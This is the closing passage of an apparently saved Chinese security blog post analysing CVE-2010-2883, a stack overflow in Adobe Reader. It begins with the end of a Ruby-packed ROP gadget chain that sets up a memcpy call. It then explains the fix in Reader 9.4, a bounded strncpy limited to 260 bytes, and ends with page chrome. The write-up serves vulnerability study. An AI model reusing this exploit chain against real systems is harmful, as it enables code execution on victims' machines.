    <span class="hljs-number">0x4a80aedc</span>,   <span class="hljs-comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span>

    <span class="hljs-number">0x4a801f90</span>,   <span class="hljs-comment"># pop eax / ret</span>
    <span class="hljs-number">0x00000034</span>,   <span class="hljs-comment"># becomes eax</span>

    <span class="hljs-number">0x4a80d585</span>,   <span class="hljs-comment"># add eax,edx / ret</span>

    <span class="hljs-number">0x4a8063a5</span>,   <span class="hljs-comment"># pop ecx / ret</span>
    <span class="hljs-number">0x4a801064</span>,   <span class="hljs-comment"># becomes ecx - ptr to ret</span>

    <span class="hljs-number">0x4a842db2</span>,   <span class="hljs-comment"># xchg eax,edi / ret</span>

    <span class="hljs-number">0x4a802ab1</span>,   <span class="hljs-comment"># pop ebx / ret</span>
    <span class="hljs-number">0x0000000a</span>,   <span class="hljs-comment"># becomes ebx - offset to modify</span>

    <span class="hljs-number">0x4a80a8a6</span>,   <span class="hljs-comment"># execute fun block</span>

    <span class="hljs-number">0x4a801f90</span>,   <span class="hljs-comment"># pop eax / ret</span>
    <span class="hljs-number">0x4a849170</span>,   <span class="hljs-comment"># becomes eax (import for memcpy)</span>

    <span class="hljs-comment"># -- call memcpy</span>
    <span class="hljs-number">0x4a80b692</span>,   <span class="hljs-comment"># jmp [eax]</span>

    <span class="hljs-number">0xffffffff</span>,   <span class="hljs-comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span>
    <span class="hljs-number">0xffffffff</span>,   <span class="hljs-comment"># becomes first arg to memcpy (dst)</span>
    <span class="hljs-number">0xffffffff</span>,   <span class="hljs-comment"># becomes second arg to memcpy (src)</span>
    <span class="hljs-number">0x00001000</span>,   <span class="hljs-comment"># becomes third arg to memcpy (length)</span>
    <span class="hljs-comment">#0x0000258b,   # ??</span>
    <span class="hljs-comment">#0x4d4d4a8a,   # ??</span>
    ].pack(<span class="hljs-string">'V*'</span>)</code></pre><h3 id="directory071553504865927629">漏洞修复</h3><p>在Adobe Reader 9.4中，将<code>strcpy</code>函数替换为了<code>sub_sub_813391E</code>函数，内部使用了<code>strncpy</code>，对缓冲区剩余长度进行了检查，并限定了缓冲区总长度为260个字节</p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/2692871414.png" alt="18.png" title="18.png"></p><p><img src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/3061027654.png" alt="19.png" title="19.png"></p>                </div>
            </article>
            <!-- <hr>
            <ul class="pager">
                <li class="previous"><a href="http://#/archives/129.html" title="RC4 算法">RC4 算法</a></li>
                <li class="next"><a href="http://#/archives/157.html" title="在x86下写x64代码以扰乱调试器">在x86下写x64代码以扰乱调试器</a></li>
            </ul> -->
            <hr>
        </div>

    </div>
    </div>
    

<div id="respond-post-150" class="comment-container">
    <div id="comments" class="clearfix">
                        <div id="respond-post-150" class="respond">
            <div class="cancel-comment-reply">
            <a id="cancel-comment-reply-link" href="http://#/archives/150.html#respond-post-150" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </div>
        
            <h3 id="response">添加新评论</h3>
            <form method="post" action="http://#/archives/150.html/comment" id="comment-form" role="form">
                                <div class="am-g">
                    <span class="am-u-lg-4 comment-input">
                        <label for="author" class="required">称呼</label>
                        <input type="text" name="author" id="author" class="text" value="" required="">
                    </span>
                    <span class="am-u-lg-4">
                        <label for="mail" class="required">Email</label>
                        <input type="email" name="mail" id="mail" class="text" value="" required="">
                    </span>
                    <span class="am-u-lg-4 comment-input">
                        <label for="url">网站</label>
                        <input type="url" name="url" id="url" class="text" value="">
                    </span>
                </div>
                                <p>
                    <label for="textarea" class="required">内容</label>
                    <textarea rows="8" cols="32" name="text" id="textarea" class="textarea" required=""></textarea>
                </p>
                <p>
                    <button type="submit" class="submit am-btn am-btn-primary">提交评论</button>
                </p>
            <input type="hidden" name="_" value="de46bb91b7373dc331ceac12e9f438ab"></form>
        </div>
        
            </div>
</div>    <div id="directory-content" class="directory-content initial headroom--top headroom--not-bottom">
        <div id="directory"><ul><span style="color: rgb(243, 129, 129); font-weight: 600;">目录</span><li><a href="http://#/archives/150.html#directory071553504865927621">CVE-2010-2883</a><ul><li><a href="http://#/archives/150.html#directory071553504865927622">漏洞简介</a></li><li><a href="http://#/archives/150.html#directory071553504865927623">漏洞复现</a></li><li><a href="http://#/archives/150.html#directory071553504865927624">漏洞分析</a><ul><li><a href="http://#/archives/150.html#directory071553504865927625">PDF格式</a><ul><li><a href="http://#/archives/150.html#directory071553504865927626">PDF的组成</a></li><li><a href="http://#/archives/150.html#directory071553504865927627">PDF文件的解析流程</a></li></ul></li><li><a href="http://#/archives/150.html#directory071553504865927628">漏洞成因</a></li><li><a href="http://#/archives/150.html#directory071553504865927629">漏洞修复</a></li></ul></li></ul></li></ul></div>
    </div>
    <!-- content end -->

<footer class="blog-footer">
    <ul class="list-inline text-center">
	    <li>
            <a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
            <span class="am-icon-btn am-icon-md am-icon-github footer-icon"></span>
        </a></li><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
    </a></ul><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">
    </a><div class="blog-text-center"><a href="https://github.com/spiritree/typecho-theme-amaze" target="_blank">© 2021 </a><a href="http://#/">lZeroyuee's Blog</a> 由 <a href="http://www.typecho.org/" target="_blank">Typecho</a> 强力驱动 Theme is <a href="https://spiritree.me/" target="_blank">Amaze made by Spiritree</a>
    </div>
</footer>
<script src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/jquery.slim.min.js.下载"></script>
<script src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/highlight.min.js.下载"></script>
<script>
    var $body=document.body;var $toggle=document.querySelector(".navbar-toggle");var $navbar=document.querySelector("#huxblog_navbar");var $collapse=document.querySelector(".navbar-collapse");var __HuxNav__={close:function(){$navbar.className=" ";setTimeout(function(){if($navbar.className.indexOf("in")<0){$collapse.style.height="0px"}},400)},open:function(){$collapse.style.height="auto";$navbar.className+=" in"}};$toggle.addEventListener("click",function(a){if($navbar.className.indexOf("in")>0){__HuxNav__.close()}else{__HuxNav__.open()}});document.addEventListener("click",function(a){if(a.target==$toggle){return}if(a.target.className=="icon-bar"){return}__HuxNav__.close()});jQuery(document).ready(function(c){var d=1170;if(c(window).width()>d){var b=c(".navbar-custom").height(),a=c(".intro-header .container").height();c(window).on("scroll",{previousTop:0},function(){var e=c(window).scrollTop(),f=c(".side-catalog");if(e<this.previousTop){if(e>0&&c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-visible")}else{c(".navbar-custom").removeClass("is-visible is-fixed")}}else{c(".navbar-custom").removeClass("is-visible");if(e>b&&!c(".navbar-custom").hasClass("is-fixed")){c(".navbar-custom").addClass("is-fixed")}}this.previousTop=e;f.show();if(e>(a+41)){f.addClass("fixed")}else{f.removeClass("fixed")}})}});
</script>
<script>
    $(document).ready(function() {
        $('pre code').each(function(i, block) {
            hljs.highlightBlock(block)
        })
        $('table').addClass('am-table')
    })
</script>
<script type="text/javascript" src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/Meting.min.js.下载"></script>

<script src="./CVE-2010-2883分析 - lZeroyuee&#39;s Blog_files/headroom.min.js.下载"></script>
<script>
var postDirectoryBuild=function(){var b=function a(l,h){var k=[],e=typeof h==="object",g=typeof h==="string",j,f,d;for(f=0,d=l.length;f<d;f++){j=l[f];if((j.nodeType===1||j.nodeType===9)&&(!h||e&&h.test(j.tagName.toLowerCase())||g&&j.tagName.toLowerCase()===h)){k.push(j)}}return k},c=function(e,f,r){var n=[],m=[],h,p,d,j,l,s,o,g,k,q;h=(function(i,C,A){var w=b(i.childNodes,/^h\d$/),x=[],v=1,B=1,z=0,D=1,t="directory"+(Math.random()+"").replace(/\D/,""),B,y,u;while(w.length){u=w.shift();C.push(u.innerHTML);y=+u.tagName.match(/\d/)[0];if(y>v){x.push(1);B+=1}else{if(y===B||y>B&&y<=v){x.push(0);B=B}else{if(y<B){x.push(y-B);B=y}}}z+=x[x.length-1];v=y;u.id=u.id||(t+D++);A.push(u.id)}if(z!==0&&x[0]===1){x[0]=0}return x})(e,n,m);j=p=document.createElement("ul");q=document.createElement("span");q.style="color:#F38181;font-weight:600;";q.innerHTML="目录";p.appendChild(q);dirNum=[];for(g=0,k=h.length;g<k;g++){d=h[g];if(d===1){l=document.createElement("ul");if(!j.lastElementChild){j.appendChild(document.createElement("li"))}j.lastElementChild.appendChild(l);j=l;dirNum.push(0)}else{if(d<0){d*=2;while(d++){if(d%2){dirNum.pop()}j=j.parentNode}}}dirNum[dirNum.length-1]++;s=document.createElement("li");o=document.createElement("a");o.href="#"+m[g];o.innerHTML=!r?n[g]:dirNum.join(".")+" "+n[g];s.appendChild(o);j.appendChild(s)}f.appendChild(p)};c(document.getElementById("post-content"),document.getElementById("directory"),false)};postDirectoryBuild();
</script>
<script>
    var postDirectory = new Headroom(document.getElementById("directory-content"), {
    tolerance: 5,
    offset: 240,
    classes: {
        initial: "initial",
        pinned: "pinned",
        unpinned: "unpinned"
    }
});
postDirectory.init();
</script></body></html>